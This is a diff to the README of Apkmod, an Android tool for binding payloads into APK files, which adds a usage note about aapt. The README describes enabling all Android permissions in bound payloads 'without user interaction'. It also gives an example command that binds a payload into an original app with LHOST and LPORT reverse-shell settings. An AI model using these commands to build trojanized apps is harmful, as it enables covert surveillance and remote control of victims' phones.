@@ -1,4 +1,4 @@
-# Apkmod v2.2
+# Apkmod v3.0
 ### Author : Lokesh @Hax4us
 
 ## _Steps For Installation_
@@ -18,6 +18,7 @@
 8. use `--frame-path` to specify framework directory like `--frame-path=/path/to/dir` 
 9. Use `--enable-perm` to enable all android permissions in binded or non binded payloads without user interaction. For example :- `apkmod --enable-perm=/path/to/binded.apk -o mybinded.apk`
 10. `apkmod --to-java=/path/to/in.apk -o outfolder` will decompile dex to java. Input can be __[.apk,.dex,.zip]__
+11. Now you can use a optional option `-a` to use __aapt__ for __binding__ and __recompiling__. Why aapt ? Because some apps can't recompile with __aapt2__ but __aapt__ can do it. But I can't drop __aapt2__ support because some apps can't recompile with __aapt__ so first recompile or bind without __aapt__ (`-a`) then if you failed then try with __aapt__. For example `apkmod -a -b /path/to/originalApp.apk -o /path/to/binded.apk LHOST=127.0.0.1 LPORT=4444` will use `aapt` otherwise `aapt2`.
 ### Size Comparision (Termux)
 Size  | Apkmod  | Third party tools
 --- | --- | ---
